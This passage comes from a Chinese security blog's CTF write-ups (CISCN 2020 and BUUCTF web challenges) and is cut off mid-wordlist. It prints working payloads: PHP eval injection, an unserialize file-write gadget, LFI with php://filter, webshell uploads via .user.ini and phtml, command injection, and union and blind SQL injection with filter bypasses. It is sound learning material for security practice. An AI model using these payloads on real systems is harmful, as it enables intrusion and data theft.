class="string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.<span class="variable">$ifstr</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . <span class="variable">$ifstr</span> . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, <span class="variable">$matches</span>[ <span class="number">2</span> ][ <span class="variable">$i</span> ], <span class="variable">$matches2</span> ) ) &#123;</span><br><span class="line">         <span class="keyword">switch</span> ( <span class="variable">$flag</span> ) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">             <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$matches2</span>[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">               <span class="variable">$out_html</span> .= <span class="variable">$matches2</span>[ <span class="number">1</span> ];</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">             <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$matches2</span>[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">               <span class="variable">$out_html</span> .= <span class="variable">$matches2</span>[ <span class="number">2</span> ];</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125; <span class="keyword">elseif</span> ( <span class="variable">$flag</span> == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">         <span class="variable">$out_html</span> .= <span class="variable">$matches</span>[ <span class="number">2</span> ][ <span class="variable">$i</span> ];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$pattern2</span> = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span> ( preg_match( <span class="variable">$pattern2</span>, <span class="variable">$out_html</span>, <span class="variable">$matches3</span> ) ) &#123;</span><br><span class="line">         <span class="variable">$out_html</span> = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . <span class="variable">$matches3</span>[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, <span class="variable">$out_html</span> );</span><br><span class="line">         <span class="variable">$out_html</span> = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . <span class="variable">$matches3</span>[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, <span class="variable">$out_html</span> );</span><br><span class="line">         <span class="variable">$out_html</span> = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . <span class="variable">$matches3</span>[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, <span class="variable">$out_html</span> );</span><br><span class="line">         <span class="variable">$out_html</span> = <span class="keyword">$this</span>-&gt;parserIfLabel( <span class="variable">$out_html</span> );</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$content</span> = str_replace( <span class="variable">$matches</span>[ <span class="number">0</span> ][ <span class="variable">$i</span> ], <span class="variable">$out_html</span>, <span class="variable">$content</span> );</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> <span class="variable">$s</span>, <span class="variable">$str</span>=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> ( <span class="keyword">empty</span>( <span class="variable">$s</span> ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">   <span class="keyword">if</span> ( strpos( <span class="variable">$s</span>, <span class="variable">$str</span> ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">     <span class="keyword">return</span> explode( <span class="variable">$str</span>, <span class="variable">$s</span> );</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">array</span>( <span class="variable">$s</span> );</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>关键点在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . <span class="variable">$ifstr</span> . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br></pre></td></tr></table></figure><p>此处应该可进行任意命令执行。</p><p>复制下来在本地调试，很容易就得到了EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;&#123;if:true)echo%201;echo%20&#96;cat%20&#x2F;flag&#96;;if(true&#125;aaa&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>这题比赛时也没做出来，也是赛后看的题解才学会的。</p><p>看来对于这种审计题还是自己太菜了，之后得找几个cms来练练。</p><p>jig.php的Jig类存在任意写两道，EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="comment">//! Storage location</span></span><br><span class="line">        <span class="variable">$dir</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>,</span><br><span class="line">        <span class="comment">//! Current storage format</span></span><br><span class="line">        <span class="variable">$format</span> = <span class="built_in">self</span>::FORMAT_JSON,</span><br><span class="line">        <span class="comment">//! Jig log</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&quot;y1ng.php&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>)),</span><br><span class="line">        <span class="comment">//! lazy load/save files</span></span><br><span class="line">        <span class="variable">$lazy</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$jig</span> = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$jig</span>));</span><br></pre></td></tr></table></figure><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>打开题目得到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这题比赛时没做出来，赛后看<a href="https://www.gem-love.com/ctf/2569.html">其他师傅的题解</a>才学到，Y1ng师傅tql。</p><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tr</span>-&gt;trick1 = NAN;</span><br><span class="line"><span class="variable">$tr</span>-&gt;trick2 = NAN;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛题目其实都不算难，但是自己的成绩还是不理想，隔壁的大师傅早AK了，orz。</p><p>太菜了。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百道CTF刷题记录(三)之BUUCTF</title>
      <link href="2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%89)%E4%B9%8BBUUCTF/"/>
      <url>2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%89)%E4%B9%8BBUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接上篇，继续刷题。</p><h1 id="刷题之旅"><a href="#刷题之旅" class="headerlink" title="刷题之旅"></a>刷题之旅</h1><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>打开题目，可以看到有个tips的跳转链接，点击后跳转到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>结合题目猜测源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>先用LFI读取<code>index.php</code>再说。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$file</span>,<span class="string">&quot;php://input&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;zip://&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;phar://&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>好像没有拦截<code>flag</code>关键字，直接用LFI读取flag.php即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/BuuCTF2/include.png" alt="成功读取后解码"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开题目，得到提示：</p><p><img src="https://img.0x002.com/article/BuuCTF2/knife.png" alt="knife"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;Syc&quot;</span>]);</span><br></pre></td></tr></table></figure><p>直接打开Webshell管理工具，这里我用蚁剑演示。</p><p><img src="https://img.0x002.com/article/BuuCTF2/addshell.png" alt="添加Shell"></p><p>在根目录下发现flag文件，右键读取即可。</p><p><img src="https://img.0x002.com/article/BuuCTF2/knife_readflag.png" alt="knife_readflag"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开题目，在HTML源代码处发现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问Secret.php得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#39;t come from &#39;https:&#x2F;&#x2F;www.Sycsecret.com&#39;</span><br></pre></td></tr></table></figure><p>我们使用Burpsuite抓包修改请求头中的Referer字段，重放数据包得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure><p>再修改User-Agent字段为<code>Syclover</code>，重放数据包得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure><p>最后修改X-Forwarded-For字段为<code>127.0.0.1</code>，重放数据包即可得到Flag。</p><ul><li>Referer记录HTTP请求来源，可起到查看跳转来源、防CSRF等作用</li><li>User-Agent记录请求对应的浏览器信息，方便页面做相应的自适应等工作</li><li>X-Forwarded-For记录请求发送的代理IP信息，可伪造，PHP中通过<code>$_SERVER[&#39;HTTP_X_FORWARD_FOR&#39;]</code>获取，不收GPC魔术引号影响。</li></ul><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>通过题目名称，简单判断为命令执行题。</p><p>老规矩，尝试列目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;ls</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><p>尝试读取index.php看看源代码怎样写的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat index.php</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;target&#x27;</span>])) &#123;</span><br><span class="line">system(<span class="string">&quot;ping -c 3 &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;target&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有黑名单等拦截方法，直接起飞，通常flag都在根目录，我们列出根目录的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;ls &#x2F;</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>读取flag文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>打开题目，发现是道上传题。</p><p><img src="https://img.0x002.com/article/BuuCTF2/checkin.png" alt="checkin"></p><p>我们先用Burp抓个上传数据包。正常上传图片发现可以成功上传：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Your dir uploads&#x2F;adeee0c170ad4ffb110df0cde294aecd &lt;br&gt;Your files : &lt;br&gt;array(4) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;index.php&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;test.jpg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并返回上传路径与同目录下的文件信息，且上传名不变。</p><p>发现上传目录内存在php文件，猜测上传php应该能够解析，尝试<code>php、php3、php3p、php4、php5、phtml、pht</code>格式均不可上传，被黑名单拦截。</p><p>尝试Apache解析漏洞，上传<code>test.php.xxx</code>，发现解析错误，同样失败告终。</p><p>一番查阅后得知，可通过上传<code>.user.ini</code>文件来给同目录下的<code>index.php</code>文件添加上一些额外的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;xxx.jpg</span><br></pre></td></tr></table></figure><p>此时，同目录下的<code>index.php</code>会相当于自动在头部<code>require xxx.jpg</code>，起到任意文件包含的作用。</p><p>先上传一个伪装成图片的webshell：</p><p><img src="https://img.0x002.com/article/BuuCTF2/upload.png" alt=""></p><p>再上传<code>.user.ini</code>文件：</p><p><img src="https://img.0x002.com/article/BuuCTF2/user_ini.png" alt="user_ini"></p><p>此时<code>/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</code>文件已自动包含上我们的test.jpg，成功一个webshell，我们可以直接连接上蚁剑，再读取flag即可。</p><p><img src="https://img.0x002.com/article/BuuCTF2/antsword.png" alt="antsword"></p><ul><li>何为GIF89a，图片格式gif必要文件头信息。</li><li>.user.ini，php配置文件之一，可配置一些php参数，可影响同目录或子目录的php文件，无需php重启。</li><li><code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>，php作用域的另一种表示方法，除此之外还有短字符<code>&lt;? ?&gt;</code>。</li></ul><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>SQL注入题，此题过滤掉了一些危险关键字，使用双写绕过即可，如or关键字，双写为：<code>oorr</code>。</p><p>查表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;1%27unioorn%20selecort%201,2,group_concat(table_name)%20froorm%20infoorrmation_schema.tables%20wheorre%20table_schema&#x3D;database()%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p>差列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;1%27unioorn%20selecort%201,2,group_concat(column_name)%20froorm%20infoorrmation_schema.columns%20wheorre%20table_schema&#x3D;database()%20anord%20table_name&#x3D;%27b4bsql%27%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p>读数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;1%27unioorn%20selecort%201,2,group_concat(id,username,passwoorrd)%20froorm%20b4bsql%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>打开题目，发现给了提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</span><br><span class="line">Now, just give the id of passage</span><br></pre></td></tr></table></figure><p>输入正常数据<code>1</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, glzjin wants a girlfriend.</span><br></pre></td></tr></table></figure><p>老规矩，单引号走起<code>1&#39;</code>，返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure><p>易知此处应该属于盲注，题目所给出的信息应该是为了节省时间。</p><p>此处空格、<code>*</code>被拦截，使用一下方法绕过：</p><ul><li>%0a等其他不可见字符</li><li>多层括号嵌套</li></ul><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;if(【判断条件】,1,2)</span><br></pre></td></tr></table></figure><p>条件为真即返回：<code>Hello, glzjin wants a girlfriend.</code></p><p>条件为假时返回：<code>Do you want to be my girlfriend?</code></p><p>由于知道flag位置，我们直接判断数据长度然后逐位判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;if(length((select%0aflag%0afrom%0aflag))&gt;【长度】,1,2)</span><br></pre></td></tr></table></figure><p>得到长度为42，接着读取数据：</p><p><img src="https://img.0x002.com/article/BuuCTF2/intruder.png" alt="intruder"></p><p>注意Burp选择<code>Cluster bomb</code>模式，然后到Payloads区设置Payload。</p><p>Payload1选择数字模式，从1到42，步长为1。Payload2为a-z、0-9、<code>&#123;</code>、<code>&#125;</code>，由于<code>-</code>被拦截，故不添加。</p><p>注意在BUU复现时还需到Options区将线程数设置为1，否则会被BUU的WAF拦截。</p><p><img src="https://img.0x002.com/article/BuuCTF2/result.png" alt="result"></p><p>最后将结果拼装即可，注意未直接判断出的位是符号<code>-</code>。</p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>又一道上传题，尝试上传php文件，提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOT！php!</span><br></pre></td></tr></table></figure><p>发现可以上传<code>phtml</code>文件：</p><p><img src="https://img.0x002.com/article/BuuCTF2/phtml.png" alt="phtml"></p><p>修改上传内容为php内容后发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO! HACKER! your file included &#39;&amp;#x3C;&amp;#x3F;&#39;</span><br></pre></td></tr></table></figure><p>提示禁止<code>&lt;?</code>，老套路了，修改为<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>的格式即可。</p><p>上传后尝试访问<code>/test.phtml</code>发现报错，估计上传目录不是根目录，直接盲猜一手upload，成功访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload&#x2F;test.phtml?a&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>打开题目，页面上给出提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Try to find out source file!</span><br></pre></td></tr></table></figure><p>写个脚本扫一下源码，附个简单的列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 